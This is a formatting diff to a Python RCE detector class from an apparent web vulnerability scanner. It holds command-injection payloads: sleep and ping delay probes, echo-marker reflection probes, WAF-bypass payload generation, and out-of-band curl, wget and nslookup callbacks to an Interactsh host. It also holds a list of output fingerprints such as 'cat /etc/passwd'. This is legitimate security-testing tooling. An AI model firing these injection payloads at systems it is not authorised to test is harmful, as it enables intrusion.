@@ -12,7 +12,6 @@ Features:
   7. Out-of-Band (Interactsh) Execution: triggers DNS/HTTP callbacks for blind sinks.
 """
 
-
 from __future__ import annotations
 
 import asyncio
@@ -49,20 +48,28 @@ class RCEDetector:
     DELAY_PAYLOADS = [
         # POSIX
         "; sleep 4",
-        "| ping -c 3 127.0.0.1", "&& ping -c 3 127.0.0.1",
+        "| ping -c 3 127.0.0.1",
+        "&& ping -c 3 127.0.0.1",
         "; ping -c 3 127.0.0.1",
-        "`sleep 4`", "$(sleep 4)",
-        "; timeout 4", "| timeout 4",
-        "; perl -e 'sleep 4'", "| perl -e 'sleep 4'",
-        "; ruby -e 'sleep 4'", "| ruby -e 'sleep 4'",
-        "; python -c 'import time;time.sleep(4)'", "| python -c 'import time;time.sleep(4)'",
-        "; node -e 'require(\"child_process\").exec(\"sleep 4\")'",
+        "`sleep 4`",
+        "$(sleep 4)",
+        "; timeout 4",
+        "| timeout 4",
+        "; perl -e 'sleep 4'",
+        "| perl -e 'sleep 4'",
+        "; ruby -e 'sleep 4'",
+        "| ruby -e 'sleep 4'",
+        "; python -c 'import time;time.sleep(4)'",
+        "| python -c 'import time;time.sleep(4)'",
+        '; node -e \'require("child_process").exec("sleep 4")\'',
         # Windows
-        "| ping -n 3 127.0.0.1", "&& ping -n 3 127.0.0.1",
+        "| ping -n 3 127.0.0.1",
+        "&& ping -n 3 127.0.0.1",
         "; ping -n 3 127.0.0.1",
-        "; timeout /t 4", "| timeout /t 4",
-        "; powershell -c \"Start-Sleep -s 4\"",
-        "; wscript.exe //B //Nologo //E:jscript \"%TEMP%\\sleep.js\"",
+        "; timeout /t 4",
+        "| timeout /t 4",
+        '; powershell -c "Start-Sleep -s 4"',
+        '; wscript.exe //B //Nologo //E:jscript "%TEMP%\\sleep.js"',
     ]
 
     def __init__(self, payload_smith, fingerprint: dict[str, Any]):
@@ -94,14 +101,9 @@ class RCEDetector:
 
         # Build payload pool
         base_payloads = self.payload_smith.get_base_payloads("rce", context_data)
-        waf = (
-            self.payload_smith.detect_waf({}, "", 0)
-            or self.fingerprint.get("waf", "unknown")
-        )
+        waf = self.payload_smith.detect_waf({}, "", 0) or self.fingerprint.get("waf", "unknown")
         if waf and waf != "unknown":
-            base_payloads.extend(
-                self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf)
-            )
+            base_payloads.extend(self.payload_smith.get_waf_bypass_payloads(base_payloads[:3], waf))
 
         all_payloads = list(dict.fromkeys(base_payloads + list(self.DELAY_PAYLOADS)))
 
@@ -155,10 +157,16 @@ class RCEDetector:
 
         marker = "RCE" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
         marker_probes = [
-            f";echo {marker}", f"&echo {marker}", f"|echo {marker}",
-            f"&&echo {marker}", f"`echo {marker}`", f"$(echo {marker})",
-            f";echo({marker})", f"|echo({marker})",  # PowerShell-compatible
-            f";print({marker})", f"|print({marker})",  # Python/perl-style
+            f";echo {marker}",
+            f"&echo {marker}",
+            f"|echo {marker}",
+            f"&&echo {marker}",
+            f"`echo {marker}`",
+            f"$(echo {marker})",
+            f";echo({marker})",
+            f"|echo({marker})",  # PowerShell-compatible
+            f";print({marker})",
+            f"|print({marker})",  # Python/perl-style
             f";printf '%s\\n' {marker}",  # POSIX printf
         ]
 
@@ -175,27 +183,29 @@ class RCEDetector:
                     if marker in body and not extract_error_classes(body):
                         diffs = BaselineAnalyzer.diff_responses(baseline_body, body, probe)
                         diffs.append(f"rce:header_marker_reflected:{marker}")
-                        findings.append(Finding(
-                            target=target,
-                            url=str(resp.url or url),
-                            method=method.upper(),
-                            param=header_name,
-                            location="header",
-                            payload=probe,
-                            attack_type=AttackType.RCE,
-                            severity=Severity.CRITICAL,
-                            verified=True,
-                            confidence=0.95,
-                            status=resp.status,
-                            headers=dict(resp.headers),
-                            body=body[:2000],
-                            diffs=diffs,
-                            baseline_body=baseline_body[:2000],
-                            baseline_status=baseline_status,
-                            verification_body=body[:2000],
-                            verification_status=resp.status,
-                            metadata={"injection_location": "http_header"},
-                        ))
+                        findings.append(
+                            Finding(
+                                target=target,
+                                url=str(resp.url or url),
+                                method=method.upper(),
+                                param=header_name,
+                                location="header",
+                                payload=probe,
+                                attack_type=AttackType.RCE,
+                                severity=Severity.CRITICAL,
+                                verified=True,
+                                confidence=0.95,
+                                status=resp.status,
+                                headers=dict(resp.headers),
+                                body=body[:2000],
+                                diffs=diffs,
+                                baseline_body=baseline_body[:2000],
+                                baseline_status=baseline_status,
+                                verification_body=body[:2000],
+                                verification_status=resp.status,
+                                metadata={"injection_location": "http_header"},
+                            )
+                        )
                         break
                 except Exception as exc:
                     logger.debug(f"variant failed, continuing: {exc}")
@@ -265,27 +275,29 @@ class RCEDetector:
                     if marker in body and not extract_error_classes(body):
                         diffs = BaselineAnalyzer.diff_responses(baseline_body, body, probe)
                         diffs.append(f"rce:json_marker_reflected:{marker}")
-                        findings.append(Finding(
-                            target=target,
-                            url=str(resp.url or url),
-                            method="POST",
-                            param=".".join(str(p) for p in path),
-                            location="json_body",
-                            payload=probe,
-                            attack_type=AttackType.RCE,
-                            severity=Severity.CRITICAL,
-                            verified=True,
-                            confidence=0.92,
-                            status=resp.status,
-                            headers=dict(resp.headers),
-                            body=body[:2000],
-                            diffs=diffs,
-                            baseline_body=baseline_body[:2000],
-                            baseline_status=baseline_status,
-                            verification_body=body[:2000],
-                            verification_status=resp.status,
-                            metadata={"injection_location": "json_ast", "json_path": path},
-                        ))
+                        findings.append(
+                            Finding(
+                                target=target,
+                                url=str(resp.url or url),
+                                method="POST",
+                                param=".".join(str(p) for p in path),
+                                location="json_body",
+                                payload=probe,
+                                attack_type=AttackType.RCE,
+                                severity=Severity.CRITICAL,
+                                verified=True,
+                                confidence=0.92,
+                                status=resp.status,
+                                headers=dict(resp.headers),
+                                body=body[:2000],
+                                diffs=diffs,
+                                baseline_body=baseline_body[:2000],
+                                baseline_status=baseline_status,
+                                verification_body=body[:2000],
+                                verification_status=resp.status,
+                                metadata={"injection_location": "json_ast", "json_path": path},
+                            )
+                        )
                         break
                 except Exception as exc:
                     logger.debug(f"variant failed, continuing: {exc}")
@@ -344,11 +356,17 @@ class RCEDetector:
         # Reflection oracle: a unique marker echoed back proves command execution.
         marker = "".join(random.choices(string.ascii_letters + string.digits, k=8))
         marker_payloads = [
-            f";echo {marker}", f"&echo {marker}", f"|echo {marker}",
-            f"&&echo {marker}", f"`echo {marker}`", f"$(echo {marker})",
-            f";echo({marker})", f"|echo({marker})",
+            f";echo {marker}",
+            f"&echo {marker}",
+            f"|echo {marker}",
+            f"&&echo {marker}",
+            f"`echo {marker}`",
+            f"$(echo {marker})",
+            f";echo({marker})",
+            f"|echo({marker})",
             f";printf '%s\\n' {marker}",
-            f";print({marker})", f"|print({marker})",
+            f";print({marker})",
+            f"|print({marker})",
         ]
 
         oob_url = None
@@ -379,12 +397,23 @@ class RCEDetector:
                 elif "timeout" in p_lower:
                     delay_family = "timeout"
 
-                if delay_family and tested_delay_families.get(delay_family, 0) < 2 and sum(tested_delay_families.values()) < 6:
+                if (
+                    delay_family
+                    and tested_delay_families.get(delay_family, 0) < 2
+                    and sum(tested_delay_families.values()) < 6
+                ):
                     tested_delay_families[delay_family] = tested_delay_families.get(delay_family, 0) + 1
                     is_blind, blind_time = await self.blind_detector.detect_time_based(
-                        context, url, method, test_params, {}, {"Referer": target},
-                        payload, "query" if method == "GET" else "body",
-                        baseline_times, param_name=param_name,
+                        context,
+                        url,
+                        method,
+                        test_params,
+                        {},
+                        {"Referer": target},
+                        payload,
+                        "query" if method == "GET" else "body",
+                        baseline_times,
+                        param_name=param_name,
                     )
                     if is_blind:
                         diffs = BaselineAnalyzer.diff_responses(baseline_body, "", payload)
@@ -425,31 +454,72 @@ class RCEDetector:
                 # Command-output fingerprints in the body
                 rce_content_indicators = [
                     # Unix/Linux command output
-                    "uid=", "gid=", "groups=", "root:", "daemon:",
-                    "whoami", "hostname", "uname -a", "pwd",
-                    "ls -la", "total ", "drwx", "-rw-r--r--",
-                    "cat /etc/passwd", "root:x:0:0",
+                    "uid=",
+                    "gid=",
+                    "groups=",
+                    "root:",
+                    "daemon:",
+                    "whoami",
+                    "hostname",
+                    "uname -a",
+                    "pwd",
+                    "ls -la",
+                    "total ",
+                    "drwx",
+                    "-rw-r--r--",
+                    "cat /etc/passwd",
+                    "root:x:0:0",
                     # Windows command output
-                    "windows ip configuration", "volume serial",
-                    "microsoft windows", "copyright (c)",
-                    "wmic", "systeminfo", "tasklist", "services.exe",
+                    "windows ip configuration",
+                    "volume serial",
+                    "microsoft windows",
+                    "copyright (c)",
+                    "wmic",
+                    "systeminfo",
+                    "tasklist",
+                    "services.exe",
                     # PHP / server info
-                    "phpinfo()", "directory of",
-                    "apache", "nginx", "httpd", "server version",
+                    "phpinfo()",
+                    "directory of",
+                    "apache",
+                    "nginx",
+                    "httpd",
+                    "server version",
                     # Database command shells
-                    "mysql>", "psql>", "sqlite>", "mongodb",
+                    "mysql>",
+                    "psql>",
+                    "sqlite>",
+                    "mongodb",
                     # Network / system info
-                    "netstat", "ss -", "ifconfig", "ip addr",
-                    "route -n", "traceroute", "ping statistics",
-                    "process list", "running processes",
+                    "netstat",
+                    "ss -",
+                    "ifconfig",
+                    "ip addr",
+                    "route -n",
+                    "traceroute",
+                    "ping statistics",
+                    "process list",
+                    "running processes",
                     # Cloud metadata
-                    "ami-id", "instance-id", "metadata.google",
+                    "ami-id",
+                    "instance-id",
+                    "metadata.google",
                     # Generic shell artifacts
-                    "$ ", "# ", "bash", "sh:", "shell",
-                    "command not found", "not recognized",
-                    "permission denied", "access denied",
+                    "$ ",
+                    "# ",
+                    "bash",
+                    "sh:",
+                    "shell",
+                    "command not found",
+                    "not recognized",
+                    "permission denied",
+                    "access denied",
                 ]
-                content_matches = [ind for ind in rce_content_indicators if ind in body.lower() and ind not in baseline_body.lower() and ind not in payload.lower()]
+                content_matches = [
+                    ind
+                    for ind in rce_content_indicators
+                    if ind in body.lower() and ind not in baseline_body.lower() and ind not in payload.lower()
+                ]
                 if content_matches:
                     signals.append("content_leak")
                     for m in content_matches:
@@ -499,12 +569,17 @@ class RCEDetector:
                 await self.interactsh.register()
                 oob_host = urlparse(oob_url).netloc
                 oob_payloads = [
-                    f";ping {oob_host}", f"|ping {oob_host}", f"`ping {oob_host}`",
-                    f";curl {oob_url}", f"|curl {oob_url}",
-                    f";wget -qO- {oob_url}", f"|wget -qO- {oob_url}",
+                    f";ping {oob_host}",
+                    f"|ping {oob_host}",
+                    f"`ping {oob_host}`",
+                    f";curl {oob_url}",
+                    f"|curl {oob_url}",
+                    f";wget -qO- {oob_url}",
+                    f"|wget -qO- {oob_url}",
                     f";python -c \"import urllib.request;urllib.request.urlopen('{oob_url}')\"",
-                    f";powershell -c \"Invoke-WebRequest -Uri {oob_url}\"",
-                    f";nslookup {oob_host}", f"|nslookup {oob_host}",
+                    f';powershell -c "Invoke-WebRequest -Uri {oob_url}"',
+                    f";nslookup {oob_host}",
+                    f"|nslookup {oob_host}",
                 ]
                 for oob_payload in oob_payloads:
                     try:
@@ -542,6 +617,3 @@ class RCEDetector:
                 pass
 
         return None
-
-
-
